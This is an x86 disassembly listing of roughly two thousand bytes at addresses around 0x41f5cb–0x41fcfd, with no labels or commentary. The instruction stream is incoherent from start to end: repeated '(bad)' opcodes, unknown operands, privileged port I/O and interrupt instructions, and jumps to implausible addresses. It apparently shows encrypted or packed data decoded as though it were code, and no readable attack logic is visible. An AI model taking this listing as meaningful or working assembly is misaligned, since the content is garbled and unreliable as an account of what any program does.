  41f5cb:	cmp    BYTE PTR [edi-0x57d6ec55],al
  41f5d1:	pop    ds
  41f5d2:	mov    ah,BYTE PTR [edi+edx*8]
  41f5d5:	mov    ?,WORD PTR [esi]
  41f5d7:	push   esi
  41f5d8:	and    ecx,eax
  41f5da:	push   ebp
  41f5db:	pop    ss
  41f5dc:	push   edx
  41f5dd:	push   ebx
  41f5de:	aaa    
  41f5df:	cli    
  41f5e0:	pushf  
  41f5e1:	xor    ebp,edx
  41f5e3:	push   ebx
  41f5e4:	cmp    dl,BYTE PTR [ecx-0x5a]
  41f5e7:	xor    DWORD PTR [eax+edx*4-0x65c67eb7],esi
  41f5ee:	pusha  
  41f5ef:	repnz rep ins DWORD PTR es:[edi],dx
  41f5f2:	dec    eax
  41f5f3:	adc    dl,BYTE PTR [ebp-0x7d]
  41f5f6:	lea    eax,[ebp+0x7a]
  41f5f9:	sub    al,0x62
  41f5fb:	jp     0x41f675
  41f5fd:	sahf   
  41f5fe:	mov    ecx,0xe61104d5
  41f603:	inc    ecx
  41f604:	xchg   esp,eax
  41f605:	cs int 0x17
  41f608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f609:	jo     0x41f5b0
  41f60b:	mov    ah,0xbb
  41f60d:	sub    BYTE PTR [ebx],0x32
  41f610:	adc    eax,0x86681ddb
  41f615:	int3   
  41f616:	je     0x41f633
  41f618:	push   edi
  41f619:	push   ebx
  41f61a:	cmp    esi,DWORD PTR [ecx-0x4a89be]
  41f620:	inc    edi
  41f621:	addr16 or esp,ebx
  41f624:	mov    edx,eax
  41f626:	cmc    
  41f627:	xchg   ebp,eax
  41f628:	fisub  WORD PTR cs:[edi-0x14]
  41f62c:	mov    ecx,DWORD PTR [ecx+0x13b7d104]
  41f632:	cmp    DWORD PTR [eax],esi
  41f634:	aad    0x3d
  41f636:	add    al,0x8c
  41f638:	lods   al,BYTE PTR ds:[esi]
  41f639:	scas   al,BYTE PTR es:[edi]
  41f63a:	lock sbb al,0x39
  41f63d:	fwait
  41f63e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f63f:	ror    DWORD PTR [ecx+0x34],cl
  41f642:	dec    edi
  41f643:	in     eax,0x26
  41f645:	cmp    ecx,DWORD PTR [ecx]
  41f647:	xchg   ebp,eax
  41f648:	ficom  WORD PTR [eax+0x63]
  41f64b:	mov    edi,0x96de0e47
  41f650:	mov    bh,0x26
  41f652:	jb     0x41f668
  41f654:	imul   edx,DWORD PTR [esi+eiz*4-0x58],0x3a7f614a
  41f65c:	mov    cl,0xd6
  41f65e:	inc    ecx
  41f65f:	inc    edx
  41f660:	add    DWORD PTR [ecx],esi
  41f662:	dec    esp
  41f663:	inc    ebx
  41f664:	inc    eax
  41f665:	pushf  
  41f666:	push   esi
  41f667:	je     0x41f625
  41f669:	(bad)  
  41f66a:	cmp    DWORD PTR [edi],edi
  41f66c:	push   cs
  41f66d:	xor    DWORD PTR [eax+eax*2+0x4c],esp
  41f671:	dec    ebx
  41f672:	xchg   ebp,eax
  41f673:	mov    esi,0x354d2624
  41f678:	jne    0x41f61e
  41f67a:	in     al,dx
  41f67b:	jo     0x41f677
  41f67d:	out    0xa9,eax
  41f67f:	jns    0x41f67d
  41f681:	mov    bl,0xc9
  41f683:	in     al,0x67
  41f685:	vpaddsb ymm1,ymm7,ymm3
  41f689:	or     al,0x77
  41f68b:	sub    edx,DWORD PTR [edx+0x62]
  41f68e:	jnp    0x41f658
  41f690:	rol    DWORD PTR [ecx+0x5],0x54
  41f694:	push   0xe5173a84
  41f699:	inc    ebx
  41f69a:	xchg   ebp,eax
  41f69b:	stos   DWORD PTR es:[edi],eax
  41f69c:	cmp    edi,ebx
  41f69e:	in     eax,0x41
  41f6a0:	jne    0x41f6c7
  41f6a2:	push   ecx
  41f6a3:	push   sp
  41f6a5:	jno    0x41f71e
  41f6a7:	push   es
  41f6a8:	imul   edx,DWORD PTR [eax],0x6a
  41f6ab:	mov    esi,0xacd19bf8
  41f6b0:	aas    
  41f6b1:	std    
  41f6b2:	popa   
  41f6b3:	ds int3 
  41f6b5:	sbb    eax,ebp
  41f6b7:	adc    BYTE PTR [esi-0x4eb4f70e],al
  41f6bd:	mov    BYTE PTR [ecx+ecx*2],ah
  41f6c0:	lods   eax,DWORD PTR ds:[esi]
  41f6c1:	pop    ebx
  41f6c2:	mov    esi,0xcd5c6e2e
  41f6c7:	fistp  DWORD PTR [ebx]
  41f6c9:	mov    ah,0xf4
  41f6cb:	mov    ah,0x38
  41f6cd:	pop    ebp
  41f6ce:	xor    al,0x1d
  41f6d0:	xor    ch,BYTE PTR [ebx+0x529d1124]
  41f6d6:	xchg   ebx,eax
  41f6d7:	nop
  41f6d8:	sub    dl,ah
  41f6da:	aaa    
  41f6db:	mov    WORD PTR [edi],gs
  41f6dd:	jle    0x41f6e1
  41f6df:	call   0xc969986a
  41f6e4:	fcomp  QWORD PTR [ebx]
  41f6e6:	xchg   ecx,eax
  41f6e7:	pop    es
  41f6e8:	shl    ah,0x35
  41f6eb:	popf   
  41f6ec:	sub    eax,0xc7177105
  41f6f1:	mov    edx,0x884e8eb4
  41f6f6:	rcr    DWORD PTR [eax-0x6f37f4b4],cl
  41f6fc:	or     eax,0x4e011f9e
  41f701:	mov    eax,0x840de9eb
  41f706:	loop   0x41f70e
  41f708:	imul   esi,DWORD PTR [edx+0x5d],0xd625bcad
  41f70f:	mov    dh,0xf6
  41f711:	nop
  41f712:	xor    DWORD PTR [eax-0x62550c1a],edi
  41f718:	push   ebp
  41f719:	sbb    cl,0x27
  41f71c:	pushf  
  41f71d:	ror    DWORD PTR [eax],cl
  41f71f:	and    eax,esp
  41f721:	add    edx,DWORD PTR [edx+0x28]
  41f724:	fdivr  DWORD PTR [edx+0x30]
  41f727:	scas   al,BYTE PTR es:[edi]
  41f728:	mov    bl,0xb8
  41f72a:	inc    esp
  41f72b:	jo     0x41f756
  41f72d:	mov    bl,0x18
  41f72f:	or     BYTE PTR [edx-0x7a],bh
  41f732:	cmp    al,0xb7
  41f734:	jae    0x41f721
  41f736:	les    ebp,FWORD PTR [ebp-0x33]
  41f739:	test   al,0x36
  41f73b:	mov    ebx,0x67f880f5
  41f740:	ror    BYTE PTR [ebx+0x395a746e],cl
  41f746:	and    ah,dl
  41f748:	pop    edx
  41f749:	xor    bl,BYTE PTR [esi]
  41f74b:	jbe    0x41f744
  41f74d:	aas    
  41f74e:	repz cmp DWORD PTR [ecx],edx
  41f751:	xor    eax,0xa01a9d82
  41f756:	jmp    0x41f754
  41f758:	mov    ch,0x60
  41f75a:	dec    ebx
  41f75b:	jmp    0x37f120e0
  41f760:	sub    eax,0x1e746002
  41f765:	test   eax,0x4010d3f0
  41f76a:	(bad)  
  41f76b:	(bad)  
  41f76d:	sbb    ch,0x63
  41f770:	mov    eax,0x1fbc728c
  41f775:	inc    edi
  41f776:	mov    ebx,0x3c2418da
  41f77b:	enter  0xde04,0xbd
  41f77f:	mov    WORD PTR [ebp+0x4e],?
  41f782:	out    dx,al
  41f783:	(bad)  
  41f784:	mov    dh,0x92
  41f786:	adc    esi,DWORD PTR [eax]
  41f788:	cmpps  xmm6,XMMWORD PTR [edx+0x7e9ac67c],0x48
  41f790:	in     al,0x61
  41f792:	(bad)  
  41f793:	push   edx
  41f794:	int    0x22
  41f796:	mov    eax,ds:0x3613516c
  41f79b:	adc    esi,ebx
  41f79d:	or     edi,ebp
  41f79f:	sub    al,BYTE PTR [edx+0x47]
  41f7a2:	lods   eax,DWORD PTR ds:[esi]
  41f7a3:	jl     0x41f7a5
  41f7a5:	daa    
  41f7a6:	push   ebp
  41f7a7:	mov    dl,0xae
  41f7a9:	es push ds
  41f7ab:	jle    0x41f73b
  41f7ad:	xor    bh,BYTE PTR [ecx-0x424804c1]
  41f7b3:	dec    ebx
  41f7b4:	adc    ecx,DWORD PTR [edx-0x5dd0385b]
  41f7ba:	jb     0x41f751
  41f7bc:	cmc    
  41f7bd:	leave  
  41f7be:	call   0x744c:0xd728c87d
  41f7c5:	retf   
  41f7c6:	in     eax,0xe3
  41f7c8:	sub    al,dh
  41f7ca:	out    dx,al
  41f7cb:	and    al,0x15
  41f7cd:	imul   edi,DWORD PTR [ebx+eiz*8-0x1cdc26e4],0x74
  41f7d5:	retf   
  41f7d6:	pop    esp
  41f7d7:	jnp    0x41f84e
  41f7d9:	jb     0x41f79c
  41f7db:	cmp    DWORD PTR [esi+ebp*8-0x5f],0x25
  41f7e0:	pop    eax
  41f7e1:	out    dx,al
  41f7e2:	lea    esp,[esi-0x18bd68e7]
  41f7e8:	int    0x9f
  41f7ea:	popa   
  41f7eb:	lahf   
  41f7ec:	push   0x1c
  41f7ee:	cmc    
  41f7ef:	push   es
  41f7f0:	mov    eax,0xc2528f07
  41f7f5:	outs   dx,BYTE PTR ds:[esi]
  41f7f6:	push   0x66
  41f7f8:	push   edi
  41f7f9:	push   ebx
  41f7fa:	xchg   ecx,eax
  41f7fb:	in     al,dx
  41f7fc:	pop    ebp
  41f7fd:	cmp    DWORD PTR [esi-0x16],ebp
  41f800:	jno    0x41f867
  41f802:	xchg   ecx,eax
  41f803:	pop    ebp
  41f804:	mov    edi,?
  41f806:	cmp    BYTE PTR [ebx-0x6f],bl
  41f809:	mov    ds:0x25ee27e1,al
  41f80e:	aaa    
  41f80f:	test   BYTE PTR [ebx+0x4439e393],ah
  41f815:	test   eax,0xa6131533
  41f81a:	inc    edi
  41f81b:	fidivr DWORD PTR [esi]
  41f81d:	frstor [eax]
  41f81f:	sbb    eax,0xdb7bbc82
  41f824:	lods   eax,DWORD PTR ds:[esi]
  41f825:	ret    0x6e5f
  41f828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f829:	je     0x41f894
  41f82b:	in     eax,0xf6
  41f82d:	aam    0x4
  41f82f:	ins    BYTE PTR es:[edi],dx
  41f830:	sub    esi,DWORD PTR [ecx-0x248e5737]
  41f836:	xchg   ebp,eax
  41f837:	fldenv [ebp+0x2b]
  41f83a:	into   
  41f83b:	es push edi
  41f83d:	std    
  41f83e:	repz mov ecx,0x79f2b908
  41f844:	das    
  41f845:	pop    ebp
  41f846:	pop    eax
  41f847:	jnp    0x41f8a2
  41f849:	enter  0x6338,0x1
  41f84d:	out    0xc1,eax
  41f84f:	sti    
  41f850:	stos   BYTE PTR es:[edi],al
  41f851:	lods   al,BYTE PTR ds:[esi]
  41f852:	outs   dx,DWORD PTR ds:[esi]
  41f853:	test   ch,bh
  41f855:	pop    esp
  41f856:	adc    al,0x25
  41f858:	inc    edx
  41f859:	cmp    edx,esi
  41f85b:	and    BYTE PTR [edx+0x51aabb1f],dl
  41f861:	xchg   ecx,eax
  41f862:	pop    ds
  41f863:	aaa    
  41f864:	xor    al,0x27
  41f866:	lea    edx,[eax]
  41f868:	sub    bh,BYTE PTR [eax+eax*2]
  41f86b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f86c:	xchg   ecx,eax
  41f86d:	push   esp
  41f86e:	push   edi
  41f86f:	fcom   DWORD PTR [eax]
  41f871:	enter  0xf2ce,0x75
  41f875:	pop    es
  41f876:	add    DWORD PTR [esi+0x3e],ecx
  41f879:	test   DWORD PTR cs:[edx],ebp
  41f87c:	ss mov edx,0x25950162
  41f882:	retf   0x379a
  41f885:	fisttp WORD PTR [ecx-0x69723013]
  41f88b:	dec    ebp
  41f88c:	fimul  WORD PTR [eax+0x5725b526]
  41f892:	in     al,dx
  41f893:	mov    cl,0xc9
  41f895:	push   ebx
  41f896:	and    eax,0x9b6e109d
  41f89b:	(bad)  
  41f89c:	and    eax,0x9e98eb8b
  41f8a1:	jb     0x41f895
  41f8a3:	lea    edi,[ebp+0x4c]
  41f8a6:	js     0x41f904
  41f8a8:	pop    eax
  41f8a9:	and    eax,0x36520669
  41f8ae:	call   0x2c75:0x55a56523
  41f8b5:	dec    edi
  41f8b6:	mov    cl,0x5e
  41f8b8:	or     WORD PTR [esi+0x26],di
  41f8bc:	xchg   ebx,eax
  41f8bd:	xor    ebp,DWORD PTR [edi-0x58]
  41f8c0:	mov    ebp,0xc82bcff1
  41f8c5:	cmp    al,0x18
  41f8c7:	addr16 mov eax,fs
  41f8ca:	call   0x7eb793be
  41f8cf:	inc    bx
  41f8d1:	jbe    0x41f87f
  41f8d3:	lahf   
  41f8d4:	rcr    DWORD PTR [ebx+0x5a],cl
  41f8d7:	mov    dl,0x86
  41f8d9:	in     al,0x7a
  41f8db:	dec    ebp
  41f8dc:	call   0x92756526
  41f8e1:	xor    al,al
  41f8e3:	fwait
  41f8e4:	jne    0x41f904
  41f8e6:	cmp    BYTE PTR [edx+eiz*1+0x4],bl
  41f8ea:	ret    0xb23b
  41f8ed:	rol    BYTE PTR [ebp+ebp*8+0x2c],0xa3
  41f8f2:	adc    DWORD PTR [esi-0xd8d0934],ecx
  41f8f8:	mov    ch,0xe1
  41f8fa:	mov    bh,0xe9
  41f8fc:	rcr    DWORD PTR [ebx+0x51],cl
  41f8ff:	out    0x1d,eax
  41f901:	mov    cl,0x7b
  41f903:	xchg   esi,eax
  41f904:	(bad)  
  41f905:	sub    DWORD PTR [ebx+ebp*4],edi
  41f908:	push   ecx
  41f909:	(bad)  
  41f90b:	mov    ds:0xb2cea154,eax
  41f910:	and    BYTE PTR [ebx],dh
  41f912:	sbb    ebx,esp
  41f914:	adc    al,0xcd
  41f916:	xor    ah,bh
  41f918:	dec    esp
  41f919:	mov    al,0xc1
  41f91b:	cmp    ecx,edi
  41f91d:	xchg   DWORD PTR ds:0xb5774c56,esi
  41f923:	pushf  
  41f924:	shr    ebp,1
  41f926:	adc    al,0x42
  41f928:	and    edx,0xb85bd64b
  41f92e:	or     ah,BYTE PTR [eax-0x3d]
  41f931:	push   ecx
  41f932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f933:	pusha  
  41f934:	push   ebp
  41f935:	push   ebp
  41f936:	je     0x41f8d7
  41f938:	call   FWORD PTR [edx+eiz*1-0x6db43ff6]
  41f93f:	dec    edx
  41f940:	lods   al,BYTE PTR ds:[esi]
  41f941:	mov    bl,0x8a
  41f943:	sub    ch,BYTE PTR [ebp-0x74ba709f]
  41f949:	fcmovb st,st(3)
  41f94b:	sahf   
  41f94c:	(bad)
  41f950:	out    0x53,eax
  41f952:	adc    DWORD PTR [ebx],ebp
  41f954:	jmp    0x821e:0xf3ed1cc5
  41f95b:	idiv   BYTE PTR [eax-0x5621e4e4]
  41f961:	out    0xf5,al
  41f963:	sub    ch,BYTE PTR [eax-0x2f]
  41f966:	loope  0x41f98a
  41f968:	cs xchg ecx,eax
  41f96a:	pshufw mm0,QWORD PTR [edi],0x3d
  41f96e:	adc    dh,dl
  41f970:	inc    ebx
  41f971:	(bad)  
  41f972:	dec    ecx
  41f973:	cmp    al,0xc0
  41f975:	cmp    eax,0x47b8ff9b
  41f97a:	call   0xaaeb9c27
  41f97f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f980:	sbb    ah,BYTE PTR [esi+ebx*2]
  41f983:	or     al,0x33
  41f985:	je     0x41f9af
  41f987:	mov    bl,0xd9
  41f989:	ret    
  41f98a:	pop    esp
  41f98b:	push   esp
  41f98c:	mov    esi,ss
  41f98e:	cld    
  41f98f:	jl     0x41f9b3
  41f991:	jmp    0xd04783b9
  41f996:	(bad)  
  41f997:	sbb    al,0x2a
  41f999:	adc    BYTE PTR [eax+0x861cd77],0x1f
  41f9a0:	enter  0xaf9b,0xe0
  41f9a4:	ins    BYTE PTR es:[edi],dx
  41f9a5:	xor    al,0xdb
  41f9a7:	inc    esi
  41f9a8:	loop   0x41f9ec
  41f9aa:	into   
  41f9ab:	outs   dx,DWORD PTR ds:[esi]
  41f9ac:	cmp    al,0xd3
  41f9ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9af:	mov    ch,0xa5
  41f9b1:	dec    esi
  41f9b2:	mov    ebx,0x878c379d
  41f9b7:	rcr    al,1
  41f9b9:	out    dx,al
  41f9ba:	xor    eax,0x423ea7cb
  41f9bf:	cwde   
  41f9c0:	sub    al,0x4c
  41f9c2:	shr    DWORD PTR [ebx],cl
  41f9c4:	jp     0x41f9b7
  41f9c6:	aas    
  41f9c7:	sahf   
  41f9c8:	push   eax
  41f9c9:	popf   
  41f9ca:	shl    DWORD PTR [ecx+0x68],0x30
  41f9ce:	cmp    cl,cl
  41f9d0:	cmp    edx,esi
  41f9d2:	int3   
  41f9d3:	mov    DWORD PTR [ebx-0x35],edx
  41f9d6:	xlat   BYTE PTR ds:[ebx]
  41f9d7:	jp     0x41f9d6
  41f9d9:	sub    eax,0x9610ce83
  41f9de:	aad    0x57
  41f9e0:	xor    ebp,DWORD PTR [edx+ebx*1-0x1807cd60]
  41f9e7:	imul   BYTE PTR [edi-0x7241971a]
  41f9ed:	sbb    ebx,DWORD PTR [ebx]
  41f9ef:	mov    ch,0x99
  41f9f1:	std    
  41f9f2:	pop    ss
  41f9f3:	inc    edi
  41f9f4:	push   ds
  41f9f5:	jo     0x41fa4a
  41f9f7:	xchg   esi,eax
  41f9f8:	and    ch,cl
  41f9fa:	ror    cl,1
  41f9fc:	jp     0x41fa2e
  41f9fe:	xor    al,0x4e
  41fa00:	(bad)
  41fa05:	das    
  41fa06:	lds    edx,FWORD PTR [edi+0x6a91813f]
  41fa0c:	(bad)  
  41fa0d:	ins    DWORD PTR es:[edi],dx
  41fa0e:	lds    eax,FWORD PTR [eax+ebp*1+0x60]
  41fa12:	es iret 
  41fa14:	push   es
  41fa15:	ret    
  41fa16:	pop    edi
  41fa17:	imul   edx,DWORD PTR ds:0xcfd83444,0x21
  41fa1e:	jg     0x41f9c0
  41fa20:	pop    edx
  41fa21:	ins    DWORD PTR es:[edi],dx
  41fa22:	push   ebp
  41fa23:	mov    al,ds:0xbb90e2f5
  41fa28:	push   es
  41fa29:	sbb    ch,BYTE PTR [esi+0x53]
  41fa2c:	lahf   
  41fa2d:	xor    al,0xc2
  41fa2f:	and    al,0xa1
  41fa31:	clc    
  41fa32:	push   0x5
  41fa34:	jmp    0xaffc:0xfdb0576a
  41fa3b:	(bad)  
  41fa3c:	adc    DWORD PTR [ebp-0x6b],ebp
  41fa3f:	hlt    
  41fa40:	ret    0xd08d
  41fa43:	adc    al,0xeb
  41fa45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa46:	retf   
  41fa47:	mov    ch,0x60
  41fa49:	fnstenv ds:[edx+0x1e454b96]
  41fa50:	repz inc esi
  41fa52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa53:	loopne 0x41fa95
  41fa55:	inc    ecx
  41fa56:	xchg   ecx,eax
  41fa57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa58:	fsub   QWORD PTR fs:[esp+esi*8-0x17]
  41fa5d:	jecxz  0x41fad2
  41fa5f:	test   DWORD PTR [ebx+0x259fd21],0x9c145ca2
  41fa69:	lock mov edi,0x8ddf1b76
  41fa6f:	jmp    0xa38f4c09
  41fa74:	inc    ecx
  41fa75:	jnp    0x41fad6
  41fa77:	sbb    eax,0x9e4a4f44
  41fa7c:	xor    ah,0x4b
  41fa7f:	ret    0xfa57
  41fa82:	mov    BYTE PTR [ebp-0x6a],0x6
  41fa86:	cmovg  edx,DWORD PTR [eax-0x593fd532]
  41fa8d:	sahf   
  41fa8e:	scas   al,BYTE PTR es:[edi]
  41fa8f:	xchg   esi,eax
  41fa90:	jb     0x41fa4e
  41fa92:	loope  0x41faf2
  41fa94:	stos   BYTE PTR es:[edi],al
  41fa95:	sbb    eax,0x716596e4
  41fa9a:	rol    DWORD PTR [ecx-0x2d],1
  41fa9d:	aas    
  41fa9e:	adc    al,dh
  41faa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faa1:	int3   
  41faa2:	inc    esp
  41faa3:	retf   0x1d50
  41faa6:	jo     0x41fa76
  41faa8:	loopne 0x41faee
  41faaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faab:	ins    DWORD PTR es:[edi],dx
  41faac:	mov    edi,0x6ee030f5
  41fab1:	imul   eax,DWORD PTR [edx],0x1f
  41fab4:	mov    WORD PTR [ecx-0x27],?
  41fab7:	inc    eax
  41fab8:	pop    eax
  41fab9:	push   cs
  41faba:	mov    eax,ds:0xf68e69cc
  41fabf:	xlat   BYTE PTR ds:[ebx]
  41fac0:	jbe    0x41fa92
  41fac2:	lods   al,BYTE PTR ds:[esi]
  41fac3:	jle    0x41fae3
  41fac5:	xchg   esi,eax
  41fac6:	jmp    0x388c3491
  41facb:	or     BYTE PTR [edi],al
  41facd:	xchg   ebp,eax
  41face:	push   edx
  41facf:	popa   
  41fad0:	mov    BYTE PTR [esi-0x3cfadc29],bh
  41fad6:	callw  0xf2ec
  41fada:	in     eax,dx
  41fadb:	lock fmul DWORD PTR [esi+0x70a64cab]
  41fae2:	xchg   edi,eax
  41fae3:	jbe    0x41fa8a
  41fae5:	sbb    eax,ebp
  41fae7:	cli    
  41fae8:	mov    esi,0xc5cc2b3e
  41faed:	dec    ecx
  41faee:	mov    eax,ds:0xf854184c
  41faf3:	jbe    0x41fa8a
  41faf5:	mov    eax,ds:0x21900c29
  41fafa:	mov    edx,esp
  41fafc:	sbb    al,0xa2
  41fafe:	in     eax,dx
  41faff:	lea    edi,[eax+0x151f5ad1]
  41fb05:	mov    BYTE PTR ds:0xcae99bd6,al
  41fb0b:	shl    BYTE PTR ds:0x7b93e738,0xda
  41fb12:	outs   dx,DWORD PTR ds:[esi]
  41fb13:	rcr    DWORD PTR [ecx-0x47230489],cl
  41fb19:	test   BYTE PTR [edx],ah
  41fb1b:	push   0xffffff8e
  41fb1d:	leave  
  41fb1e:	or     dh,ah
  41fb20:	cli    
  41fb21:	pop    es
  41fb22:	sahf   
  41fb23:	test   al,0x84
  41fb25:	cmp    dl,ah
  41fb27:	repz adc al,0x1
  41fb2a:	jp     0x41fb54
  41fb2c:	out    0x3b,eax
  41fb2e:	or     BYTE PTR [ecx+0x560057af],dh
  41fb34:	and    eax,0x761f4533
  41fb39:	pushf  
  41fb3a:	sub    BYTE PTR [edi],cl
  41fb3c:	or     ch,BYTE PTR [eax+0x6cc92865]
  41fb42:	mov    dl,0xd4
  41fb44:	and    BYTE PTR [esi-0x76],ch
  41fb47:	cmp    eax,0xad936af2
  41fb4c:	adc    al,0x1c
  41fb4e:	pop    edi
  41fb4f:	out    dx,al
  41fb50:	jns    0x41fb56
  41fb52:	mov    al,0xd0
  41fb54:	mov    ebx,0x6e8cce59
  41fb59:	fs das 
  41fb5b:	pop    es
  41fb5c:	iret   
  41fb5d:	mov    eax,0x3368f522
  41fb62:	push   es
  41fb63:	pop    ebp
  41fb64:	xchg   edi,eax
  41fb65:	adc    DWORD PTR [ebx],ecx
  41fb67:	loop   0x41fb84
  41fb69:	push   0xab2e7f77
  41fb6e:	stos   DWORD PTR es:[edi],eax
  41fb6f:	(bad)  
  41fb70:	mov    eax,0x89b123ef
  41fb75:	xchg   edx,eax
  41fb76:	cld    
  41fb77:	push   ds
  41fb78:	ss jb  0x41fb32
  41fb7b:	xor    eax,ebp
  41fb7d:	xchg   ecx,eax
  41fb7e:	outs   dx,DWORD PTR ds:[esi]
  41fb7f:	or     ch,BYTE PTR ds:0x46d8fa3f
  41fb85:	shr    ah,1
  41fb87:	lock xchg dl,ah
  41fb8a:	sub    esp,ebp
  41fb8c:	in     eax,0x90
  41fb8e:	fild   WORD PTR [ebx-0x5b149478]
  41fb94:	lahf   
  41fb95:	out    dx,eax
  41fb96:	or     bh,BYTE PTR [edi]
  41fb98:	jnp    0x41fb2e
  41fb9a:	inc    esi
  41fb9b:	push   ebx
  41fb9c:	dec    eax
  41fb9d:	or     BYTE PTR ss:[esi],0x28
  41fba1:	in     al,dx
  41fba2:	sub    bh,BYTE PTR [edi]
  41fba4:	push   0x3b
  41fba6:	fcmove st,st(2)
  41fba8:	jae    0x41fb90
  41fbaa:	pop    esp
  41fbab:	les    edx,FWORD PTR [ebp+0x5d]
  41fbae:	nop
  41fbaf:	push   esp
  41fbb0:	dec    edi
  41fbb1:	aas    
  41fbb2:	jbe    0x41fbfe
  41fbb4:	outs   dx,BYTE PTR ds:[esi]
  41fbb5:	lods   al,BYTE PTR ds:[esi]
  41fbb6:	in     eax,0x4
  41fbb8:	cld    
  41fbb9:	test   al,0x8
  41fbbb:	inc    ebx
  41fbbc:	sti    
  41fbbd:	pop    ds
  41fbbe:	xchg   edi,eax
  41fbbf:	jge    0x41fb52
  41fbc1:	mov    al,ds:0xa5654639
  41fbc6:	push   ebp
  41fbc7:	push   esi
  41fbc8:	lods   eax,DWORD PTR ds:[esi]
  41fbc9:	arpl   WORD PTR [ebp-0x2d7339d3],ax
  41fbcf:	dec    ebx
  41fbd0:	push   eax
  41fbd1:	les    eax,FWORD PTR [esi+0x73444fe3]
  41fbd7:	push   0xfffffff7
  41fbd9:	scas   eax,DWORD PTR es:[edi]
  41fbda:	stos   BYTE PTR es:[edi],al
  41fbdb:	out    dx,al
  41fbdc:	pop    edi
  41fbdd:	popf   
  41fbde:	neg    esp
  41fbe0:	mov    edx,DWORD PTR [ecx+0x62]
  41fbe3:	ins    DWORD PTR es:[edi],dx
  41fbe4:	or     edi,DWORD PTR ds:0x2a2cff27
  41fbea:	jns    0x41fc1f
  41fbec:	xchg   esp,eax
  41fbed:	and    bh,BYTE PTR [edx+eax*2]
  41fbf0:	inc    esi
  41fbf1:	mov    cl,0x9f
  41fbf3:	inc    ebp
  41fbf4:	inc    ebx
  41fbf5:	sub    bl,BYTE PTR [edx-0x70]
  41fbf8:	fs cmp ecx,esp
  41fbfb:	sbb    esp,0x618c3bef
  41fc01:	push   DWORD PTR ds:0x4772ade1
  41fc07:	out    dx,eax
  41fc08:	mov    dl,0xe5
  41fc0a:	or     BYTE PTR [esi+0x15239dbf],bl
  41fc10:	mov    esi,0x8c7f4976
  41fc15:	stos   BYTE PTR es:[edi],al
  41fc16:	add    eax,0xccb4df70
  41fc1b:	xor    eax,0xe96c581c
  41fc20:	fwait
  41fc21:	inc    ebx
  41fc22:	imul   esi,DWORD PTR [edi-0x7c],0xde7457ec
  41fc29:	outs   dx,DWORD PTR ds:[esi]
  41fc2a:	add    al,0x75
  41fc2c:	ror    BYTE PTR es:[edx-0x76eba50c],1
  41fc33:	xchg   BYTE PTR [esi-0x45c89e62],bl
  41fc39:	sub    eax,0x7429973a
  41fc3e:	outs   dx,DWORD PTR ds:[esi]
  41fc3f:	mov    edi,0x53708ae6
  41fc44:	push   cs
  41fc45:	pop    esp
  41fc46:	pop    edi
  41fc47:	inc    ebx
  41fc48:	clc    
  41fc49:	ds push edx
  41fc4b:	xlat   BYTE PTR ds:[ebx]
  41fc4c:	stos   DWORD PTR es:[edi],eax
  41fc4d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc50:	call   0xfb0:0xd84b57f9
  41fc57:	int    0x7c
  41fc59:	stos   DWORD PTR es:[edi],eax
  41fc5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc5b:	jle    0x41fc01
  41fc5d:	xchg   edx,eax
  41fc5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc5f:	ja     0x41fcd4
  41fc61:	fidivr WORD PTR [esi+edx*1+0x1a3330f1]
  41fc68:	int    0xfe
  41fc6a:	icebp  
  41fc6b:	mov    ebx,0x9895066a
  41fc70:	pusha  
  41fc71:	fcom   DWORD PTR [ebx]
  41fc73:	int    0x22
  41fc75:	sbb    DWORD PTR [edx+eax*1+0x45],eax
  41fc79:	sub    DWORD PTR [esp+ebp*4],0xffffffb0
  41fc7d:	sub    DWORD PTR [ecx-0xc2abe72],esi
  41fc83:	jns    0x41fc56
  41fc85:	aas    
  41fc86:	in     al,0x50
  41fc88:	inc    ebp
  41fc89:	(bad)
  41fc8c:	add    edx,DWORD PTR [ecx-0x3e]
  41fc8f:	ja     0x41fc7a
  41fc91:	daa    
  41fc92:	inc    ecx
  41fc93:	test   DWORD PTR [ebp+0x42],edi
  41fc96:	add    DWORD PTR [ebx+0x553f4c72],ecx
  41fc9c:	ins    DWORD PTR es:[edi],dx
  41fc9d:	mov    ds:0x9ded1622,al
  41fca2:	or     eax,0x113534b7
  41fca7:	mov    dh,0xca
  41fca9:	jmp    DWORD PTR [edi+0x44a276ce]
  41fcaf:	retf   0x5a4d
  41fcb2:	mov    ah,0x5a
  41fcb4:	out    dx,al
  41fcb5:	loope  0x41fce2
  41fcb7:	loope  0x41fc58
  41fcb9:	jmp    0x4c62c1d0
  41fcbe:	stc    
  41fcbf:	jbe    0x41fccf
  41fcc1:	cmp    ebx,eax
  41fcc3:	jnp    0x41fcb1
  41fcc5:	imul   esi,DWORD PTR [edx+esi*4+0x2e],0xffffff83
  41fcca:	stc    
  41fccb:	add    ebx,DWORD PTR [ebp-0x19]
  41fcce:	test   BYTE PTR [edx],0xb9
  41fcd1:	jl     0x41fcee
  41fcd3:	adc    eax,0xb3599947
  41fcd8:	stc    
  41fcd9:	(bad)  
  41fcda:	std    
  41fcdb:	fcom   QWORD PTR [esi+0x66]
  41fcde:	jmp    0x8c925689
  41fce3:	imul   ebp,DWORD PTR [eax+0x6e4fce45],0xffffffa4
  41fcea:	jo     0x41fd07
  41fcec:	add    eax,0x1b69ed61
  41fcf1:	xor    eax,0x8ac07adb
  41fcf6:	xor    ebp,eax
  41fcf8:	nop
  41fcf9:	jle    0x41fd2a
  41fcfb:	sar    DWORD PTR [ecx],1
  41fcfd:	jb     0x41fd59
